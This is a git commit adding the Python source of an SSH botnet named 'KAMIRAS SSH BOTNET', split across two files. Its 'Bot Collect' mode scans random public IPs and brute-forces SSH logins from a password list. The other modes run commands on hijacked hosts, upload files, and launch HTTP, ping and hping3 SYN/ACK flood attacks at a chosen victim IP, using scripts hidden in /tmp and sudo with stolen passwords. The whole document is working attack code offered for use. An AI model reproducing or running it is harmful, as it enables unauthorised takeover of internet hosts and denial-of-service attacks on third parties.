6337ba5c2c4d99419f766add210aca085a254063
kamiras <80554217+kamiras@users.noreply.github.com>
2021-03-28 23:59:29 +0200

    Main Files

---
+++ ataque.py
@@ -0,0 +1,281 @@
+import paramiko
+import time
+import random
+import socket
+import fileinput
+import os
+
+ip_equipos=[]
+user_equipos=[]
+password_equipos=[]
+hping_equipos=[]
+ip_equipos_alive=[]
+user_equipos_alive=[]
+password_equipos_alive=[]
+hping_equipos_alive=[]
+total_equipos=0
+total_bots=0
+
+def load_ataque():
+
+    global total_equipos
+
+    with open("equipos.txt","r") as e:
+
+        for line in e:
+            ip_equipos.append(line.split(":")[0])
+            user_equipos.append(line.split(":")[1])
+            password_equipos.append(line.split(":")[2])
+            hping_equipos.append(line.strip("\n").split(":")[3])
+            total_equipos+=1
+
+def list_of_bots():
+
+    print('''
++--------------+
+| List of bots |
++--------------+''')
+
+    for i in range(total_equipos):
+        
+        print(f'''       |
+       +---> Bot {[i]}: IP:{ip_equipos[i]} USER:{user_equipos[i]} PASS={password_equipos[i]}''')
+
+def select_bot(option):
+
+    ip=""
+    password=""
+    user=""
+
+    for i in range(total_equipos):
+
+        if i==option:
+            ip=ip_equipos[i]
+            password=password_equipos[i]
+            user=user_equipos[i]
+
+    return ip, user, password
+
+def all_bots(comando, see):
+
+    for i in range(total_bots):
+
+        try:
+
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )
+
+            ssh.connect(ip_equipos_alive[i], username=user_equipos_alive[i], password=password_equipos_alive[i], timeout=0.5)
+
+            stdin, stdout, stderr = ssh.exec_command(comando)
+
+            print(f'[*] Command sent IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}')
+
+            if see == 'y':
+                print(stdout.read().decode())
+                print("\n")
+
+            ssh.close()
+
+            continue
+
+        except paramiko.ssh_exception.AuthenticationException:
+
+            print(f'[*] Authentication Failed IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}')
+
+        except paramiko.SSHException:
+
+            print(f'[*] The request was rejected or the channel was closed IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}')
+
+        except paramiko.BadHostKeyException:
+
+            print(f'[*] The server’s host key could not be verified IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}')
+
+        except socket.error:
+
+            print(f'[*] Socket error ocurred IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}')
+
+        ssh.close()
+
+def single_bot(comando, see, bot, user, password):
+
+        try:
+
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )
+
+            ssh.connect(bot, username=user, password=password)
+
+            if password == 'abcdefghijklmnopqrstuvpksisjdiad9238ue398j9jlsuihaiaushfl9w8yh948tujsh':
+                    print(f'[*] False Authentication')
+                    return 0
+
+            stdin, stdout, stderr = ssh.exec_command(comando)
+
+            print(f'[*] Command sent IP:{bot} USER:{user} PASS={password}\n')
+
+            if see == 'y':
+                print(stdout.read().decode())
+                print("\n")
+
+            ssh.close()
+
+        except paramiko.ssh_exception.AuthenticationException:
+
+            print(f'[*] Authentication Failed IP:{bot} USER:{user} PASS={password}')
+
+        except paramiko.SSHException:
+
+            print(f'[*] The request was rejected or the channel was closed IP:{bot} USER:{user} PASS={password}')
+
+        ssh.close()
+
+def sftp(bot, user, password, filepath, localpath):
+
+    try:
+
+        host,port = bot,22
+        transport = paramiko.Transport((host,port))
+
+        transport.connect(None,user,password)
+   
+        sftp = paramiko.SFTPClient.from_transport(transport)
+
+        sftp.put(localpath,filepath)
+
+        if sftp: sftp.close()
+        if transport: transport.close()
+
+        print(f'[*] The file was sent successfully IP:{bot} USER:{user} PASS={password}')
+
+    except paramiko.SSHException:
+
+        print("[*] Error in the negotiation of SFTP")
+
+    except FileNotFoundError:
+
+        print("[*] The LOCALPATH file was not found")
+
+    except IOError:
+
+        print("[*] File couldn't be sent, not enough permissions")
+
+def bots_alive():
+
+    global total_bots
+
+    print('''
++--------------------+
+| List of bots alive |
++--------------------+''')
+
+    for i in range(total_equipos):
+
+        a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        location=(ip_equipos[i],22)
+        a_socket.settimeout(0.1)
+
+        result_of_check = a_socket.connect_ex(location)
+
+        if result_of_check == 0:
+            print(f'''       |
+       +---> Bot {[i]}: IP:{ip_equipos[i]} USER:{user_equipos[i]} PASS={password_equipos[i]}''')
+            a_socket.close()
+            ip_equipos_alive.append(ip_equipos[i])
+            user_equipos_alive.append(user_equipos[i])
+            password_equipos_alive.append(password_equipos[i])
+            hping_equipos_alive.append(hping_equipos[i])
+            total_bots+=1
+
+    print(f'\nBots alive: {total_bots}')
+
+    return total_bots
+
+def attack(ip, command, puerto, tipo):
+
+    for i in range(total_bots):
+
+        try:
+
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )
+
+            ssh.connect(ip_equipos_alive[i], username=user_equipos_alive[i], password=password_equipos_alive[i])
+
+            if password_equipos_alive[i] == 'abcdefghijklmnopqrstuvpksisjdiad9238ue398j9jlsuihaiaushfl9w8yh948tujsh':
+                    print(f'[*] False Authentication')
+                    continue
+
+            numero=str(random.randrange(1000000, 10000000, 1))
+
+            print(f'[*] Command sent IP:{ip_equipos_alive[i]} USER:{user_equipos_alive[i]} PASS={password_equipos_alive[i]}\n')
+
+            if command == 1:
+
+                stdin, stdout, stderr = ssh.exec_command(f"touch /tmp/system-tmp"+numero+".sh \n cd /tmp \n echo 'for i in {1..10000..1}; do curl "+ip+"; done'>> system-tmp"+numero+".sh \n chmod 755 system-tmp"+numero+".sh \n ./system-tmp"+numero+".sh &", timeout=6)
+
+            elif command == 2:
+
+                d, e, f = ssh.exec_command(f"touch /tmp/system-tmp"+numero+".sh \n cd /tmp \n echo 'for i in {1..10000..1}; do ping "+ip+"; done'>> system-tmp"+numero+".sh \n chmod 755 system-tmp"+numero+".sh \n ./system-tmp"+numero+".sh &")
+
+            elif command == 3:
+
+                if hping_equipos_alive[i] == "NS":
+
+                    stdin, stdout, stderr = ssh.exec_command(f"sudo -S <<< '{password_equipos_alive[i]}' apt install hping3")
+                    exit_status = stdout.channel.recv_exit_status()          # Blocking call
+
+                    if exit_status == 0:
+                        print("[*] Hping3 Installing Completed\n")
+                    else:
+                        print("[*] Hping3 Installing Failed, Error: ",exit_status+"\n")
+
+                    textToSearch = ip_equipos_alive[i]+":"+user_equipos_alive[i]+":"+password_equipos_alive[i]+":"+"NS"
+                    textToReplace = ip_equipos_alive[i]+":"+user_equipos_alive[i]+":"+password_equipos_alive[i]+":"+"SI"
+                    fileToSearch  = "equipos.txt"
+                    tempFile = open( fileToSearch, 'r+' )
+
+                    for line in fileinput.input( fileToSearch ):
+                        tempFile.write( line.replace( textToSearch, textToReplace ) )
+                    tempFile.close()
+
+                    a,b,c=ssh.exec_command("touch /tmp/system-tmp"+numero+".sh \n cd /tmp \n echo 'hping3 -p "+puerto+" "+tipo+" --flood "+ip+"'>> system-tmp"+numero+".sh \n chmod 755 system-tmp"+numero+".sh \n sudo -S <<< "+password_equipos_alive[i]+" ./system-tmp"+numero+".sh &\n")
+                    time.sleep(1)
+                    '''
+                    b_exit_status=b.channel.recv_exit_status()
+                    if b_exit_status==0:
+                        print("[*] Hping3 command has been Executed\n")
+                    else:
+                        print("[*] Hping3 command has Failed\n")
+                    '''
+
+                elif hping_equipos_alive[i] == "SI":
+
+                    a,b,c=ssh.exec_command("touch /tmp/system-tmp"+numero+".sh \n cd /tmp \n echo 'hping3 -p "+puerto+" "+tipo+" --flood "+ip+"'>> system-tmp"+numero+".sh \n chmod 755 system-tmp"+numero+".sh \n sudo -S <<< "+password_equipos_alive[i]+" ./system-tmp"+numero+".sh &\n")
+                    time.sleep(1)
+
+            ssh.close()
+
+        except paramiko.ssh_exception.AuthenticationException:
+
+            print(f'[*] Authentication Failed IP:{bot} USER:{user} PASS={password}')
+
+        except paramiko.SSHException:
+
+            print(f'[*] The request was rejected or the channel was closed IP:{bot} USER:{user} PASS={password}')
+
+        ssh.close()
+
+def delete_list():
+    ip_equipos.clear()
+    user_equipos.clear()
+    password_equipos.clear()
+    hping_equipos.clear()
+    ip_equipos_alive.clear()
+    user_equipos_alive.clear()
+    password_equipos_alive.clear()
+    hping_equipos_alive.clear()
+    global total_equipos
+    total_equipos=0
+    global total_bots
+    total_bots=0
---
+++ ssh.py
@@ -0,0 +1,283 @@
+import paramiko
+import time
+import random
+import socket
+import struct
+from ataque import load_ataque
+from ataque import all_bots
+from ataque import list_of_bots
+from ataque import select_bot
+from ataque import single_bot
+from ataque import sftp
+from ataque import bots_alive
+from ataque import delete_list
+from ataque import attack
+
+USER=[]
+PASS=[]
+total_list=0
+
+def load():
+
+    with open("passwords.txt","r") as f:
+        for line in f:
+            USER.append(line.split(":")[0])
+            PASS.append(line.strip("\n").split(":")[1])
+            global total_list
+            total_list+=1
+
+def conexion(ip):
+
+    equipos=open("equipos.txt","a")
+
+    for i in range(total_list):
+
+        try:
+
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )
+
+            message=ssh.connect(ip, username=USER[i], password=PASS[i])
+
+            '''
+            if message == 0:
+                if PASS[i] == 'abcdefghijklmnopqrstuvpksisjdiad9238ue398j9jlsuihaiaushfl9w8yh948tujsh':
+                    print(f'[*] False Authentication')
+                    continue
+            '''
+
+            print(f'[*] Authentication Worked IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
+
+            equipos.write(f'{ip}:{USER[i]}:{PASS[i]}:NS\n')
+            equipos.close()
+
+            ssh.close()
+
+            break
+
+        except paramiko.ssh_exception.AuthenticationException:
+
+            print(f'[*] Authentication Failed IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
+
+        except paramiko.SSHException:
+
+            print(f'[*] Device Failed Executing the Command IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
+            break
+
+        except socket.error:
+
+            print(f'[*] Connection Failed IP:{ip} USER:{USER[i]} PASS={PASS[i]}')
+            break
+
+        ssh.close()
+
+def IP():
+
+    random_ip=socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
+    sv=int(random_ip.split(".")[0])
+    sb=int(random_ip.split(".")[1])
+    while(sv==127 or sv==0 or sv==3 or sv==15 or sv==56 or sv==10 or (sv==192 and sb==168) or (sv == 172 and sb >= 16 and sb < 32) or (sv == 100 and sb >= 64 and sb < 127) or (sv==169 and sb>254) or (sv==198 and sb>= 18 and sb<20) or sv>=224 or sv==6 or sv==7 or sv==11 or sv==21 or sv==22 or sv==26 or sv==28 or sv==29 or sv==30 or sv==33 or sv==55 or sv==214 or sv==215):
+        print(f'[*] IP {random_ip} not valid\n')
+        return False
+    print(f'[*] IP {random_ip} valid')
+    return random_ip
+
+def alive(ip):
+    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    location=(ip,22)
+    a_socket.settimeout(0.1)
+
+    result_of_check = a_socket.connect_ex(location)
+
+    if result_of_check == 0:
+        print(f"    +---> {ip} with Port 22 is open\n")
+        a_socket.close()
+        return True
+    else:
+        print(f"    +---> {ip} with Port 22 is not open\n")
+        a_socket.close()
+        return False
+
+def cls(): print("\n"*20)
+
+def none_bots(bot):
+    if bot==0:
+        print("\nNot enough bots to start an attack, Press enter to exit: ")
+        exit(0)
+
+if __name__ == '__main__':
+
+    while 1:
+
+        option=int(input('''
+
+            ██╗  ██╗ █████╗ ███╗   ███╗██╗██████╗  █████╗ ███████╗               
+            ██║ ██╔╝██╔══██╗████╗ ████║██║██╔══██╗██╔══██╗██╔════╝               
+            █████╔╝ ███████║██╔████╔██║██║██████╔╝███████║███████╗               
+            ██╔═██╗ ██╔══██║██║╚██╔╝██║██║██╔══██╗██╔══██║╚════██║               
+            ██║  ██╗██║  ██║██║ ╚═╝ ██║██║██║  ██║██║  ██║███████║               
+            ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝               
+███████╗███████╗██╗  ██╗    ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗
+██╔════╝██╔════╝██║  ██║    ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
+███████╗███████╗███████║    ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║   
+╚════██║╚════██║██╔══██║    ██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║   
+███████║███████║██║  ██║    ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║   
+╚══════╝╚══════╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   
+                                                                                 
+           +------------------------------------------------------+
+           |                                                      |
+           |                    1) Bots Alive                     |
+           |                                                      |
+           |  2) Command Execution              3) File Upload    |
+           |                                                      |
+           |  4) HTTP/HTTPS Attack              5) PING Attack    |
+           |                                                      |
+           |  6) SYN Attack ( Best Attack )     7) ACK Attack     |
+           |                                                      |
+           |                    8) Bot Collect                    |
+           |                                                      |
+           +------------------------------------------------------+
+
+Select the option: '''))
+
+        if option==1:
+
+            load_ataque()
+            x=bots_alive()
+            none_bots(x)
+            delete_list()
+            input("\nPress enter to continue...")
+            cls()
+
+        if option==2:
+
+            option2=int(input('''
+                +---------------------------------------------+
+                |                                             |
+                |  1) Execute the commnand in all your bots   |
+                |                                             |
+                |  2) Execute a commnand in a single bot      |
+                |                                             |
+                +---------------------------------------------+
+
+Select the option: '''))
+
+            if option2==1:
+                load_ataque()
+                x=bots_alive()
+                none_bots(x)
+                print("REMEMBER! To concatenate commands just add ; ex( ls;pwd;cd ..;pwd )\n")
+                command=input("Select the command that you want to execute in your bots: ")
+                see=input("Would you like to see the outputs of the commands ? y/n: ")
+                print("")
+                all_bots(command, see)
+                delete_list()
+                input("Press enter to continue...")
+                cls()
+
+            if option2==2:
+
+                load_ataque()
+                x=bots_alive()
+                none_bots(x)
+                bot=int(input("\nSelect the number of the bot: "))
+                result=select_bot(bot)
+                print(f'''\n
+Connecting {result[0]}...
+
+REMEMBER! Press exit to leave the device | To concatenate commands just add ; ex( ls;pwd;cd ..;pwd )\n''')
+
+                while 1:
+                    command=input(f'{result[1]}@{result[0]}:~#')
+                    print("")
+                    if command=='exit':
+                        break
+                    single_bot(command, "y", result[0], result[1], result[2])
+                delete_list()
+                input("Press enter to continue...")
+                cls()
+
+        if option==3:
+
+                load_ataque()
+                x=bots_alive()
+                none_bots(x)
+                bot=int(input("\nSelect the number of the bot: "))
+                result=select_bot(bot)
+
+                localpath=input("Write the LOCAL path file ex( /home/user/program.exe or C://User/file.txt ): ")
+                remotepath=input("Write the REMOTE path file ex( /tmp/yourfile.sh or /home/car.jpg ): ")
+
+                print(f'\nConnecting and Uploading {localpath} to {result[0]}...\n')
+                sftp(result[0], result[1], result[2], remotepath, localpath)
+                delete_list()
+                input("Press enter to continue...")
+                cls()
+
+        if option==4:
+
+            load_ataque()
+            x=bots_alive()
+            none_bots(x)
+            ip=input("\nGive the the victim's ip: ")
+            attack(ip, 1, None, None)
+            input("\nThe attack is being made. Press enter to continue...")
+            delete_list()
+            cls()
+
+        if option==5:
+
+            load_ataque()
+            x=bots_alive()
+            none_bots(x)
+            ip=input("\nGive me the victim's ip: ")
+            attack(ip, 2, None, None)
+            input("\nThe attack is being made. Press enter to continue...")
+            delete_list()
+            cls()
+
+        if option==6:
+
+            load_ataque()
+            x=bots_alive()
+            none_bots(x)
+            ip=input("\nGive me the victim's ip: ")
+            port=str(input("Give me the victim's port: "))
+            attack(ip, 3, port, "-S")
+            input("\nThe attack is being made. Press enter to continue...")
+            delete_list()
+            cls()
+
+        if option==7:
+
+            load_ataque()
+            x=bots_alive()
+            none_bots(x)
+            ip=input("\nGive me the victim's ip: ")
+            port=str(input("Give me the victim's port: "))
+            attack(ip, 3, port, "-A")
+            input("\nThe attack is being made. Press enter to continue...")
+            delete_list()
+            cls()
+
+        if option==8:
+
+            load()
+
+            while 1:
+
+                    a=IP()
+
+                    if a==False:
+
+                        continue
+
+                    if alive(a) == True:
+
+                        try:
+
+                            conexion(a)
+
+                        except:
+
+                            continue
